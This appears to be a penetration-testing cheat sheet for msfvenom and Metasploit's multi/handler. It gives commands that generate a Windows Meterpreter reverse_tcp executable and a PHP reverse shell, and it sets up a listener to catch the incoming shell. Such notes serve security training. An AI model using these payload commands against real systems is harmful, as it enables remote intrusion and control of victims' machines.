Usage:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe > rev_shell.exe

Options:
  -p      Payload
  -f      Format
  -e      Encoder
  LHOST   Local host
  LPORT   Local port (Listening port)

Commands:
  msfvenom -l payloads      Show all payloads available
  msfvenom --list formats   List supported output formats. You can either generate stand-alone payloads 
                            (Windows executable for Meterpreter) or get a usable raw format (e.g. python)
  msfvenom -f raw -e php/base64
                            Encoding (with the -e parameter), in Base64, and the output format generate as raw. Encoders do not aim
                            to bypass antivirus installed on the target system. As the name suggests, they encode the payload


Example Using Handler for Reverse Shell:
  msfvenom -p php/reverse_php LHOST=<LOCAL>IP> LPORT=<LOCAL_PORT> -f raw > reverse_shell.php
                              Generate reverse shell payload, use the same values to set up exploit/multi/handler module (listener)
  use exploit/multi/handler   Use Multi Handler to receive the incoming connection. Multi handler supports all Metasploit payloads
                              and can be used for Meterpreter as well as regular shells
  set payload php/reverse_php
  set lhost <LOCAL_IP>
  set lport <LOCAL_PORT>
  run                         When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a *shell*
                              If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a *Meterpreter shell*
